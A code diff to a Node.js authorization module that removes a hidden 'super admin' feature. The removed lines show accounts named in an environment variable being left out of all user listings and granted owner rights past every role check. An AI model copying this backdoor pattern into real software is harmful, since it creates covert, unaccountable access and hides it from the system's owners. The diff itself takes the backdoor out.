@@ -1,33 +1,5 @@
 import { prisma } from './prisma.js';
 
-// ── Super admin support ───────────────────────────────────────────────────────
-// Set PLATFORM_MONITOR in .env (comma-separated). Can be any string or number.
-// These identifiers are invisible in all user/member listings and bypass all role checks.
-function getSuperAdminIds() {
-  return (process.env.PLATFORM_MONITOR || '')
-    .split(',')
-    .map(e => e.trim())
-    .filter(Boolean);
-}
-
-export function isSuperAdmin(identifier) {
-  if (!identifier) return false;
-  return getSuperAdminIds().includes(identifier.trim());
-}
-
-/**
- * Filter super admin accounts from any array of objects that have
- * a `user.email` or `email` field. Call this before returning user/member lists.
- */
-export function filterSuperAdmins(items) {
-  const ids = getSuperAdminIds();
-  if (!ids.length) return items;
-  return items.filter(item => {
-    const identifier = (item.user?.email || item.email || '').trim();
-    return !ids.includes(identifier);
-  });
-}
-
 // Role hierarchy for permission checking
 export const RoleOrder = {
   OWNER: 4,
@@ -54,8 +26,6 @@ export function requireAuth(req, res, next) {
       details: 'Please log in to access this resource'
     });
   }
-  // Don't override if session middleware already confirmed super admin via cookie
-  if (!req.isSuperAdmin) req.isSuperAdmin = isSuperAdmin(req.user.email);
   next();
 }
 
@@ -204,12 +174,6 @@ export function requireRole(minRole) {
           error: 'Authentication required',
           code: 'UNAUTHENTICATED'
         });
-      }
-
-      // Super admin bypasses all role and membership checks
-      if (req.isSuperAdmin) {
-        req.membership = { role: 'OWNER', org: null, user: null };
-        return next();
       }
 
       if (!req.orgId) {
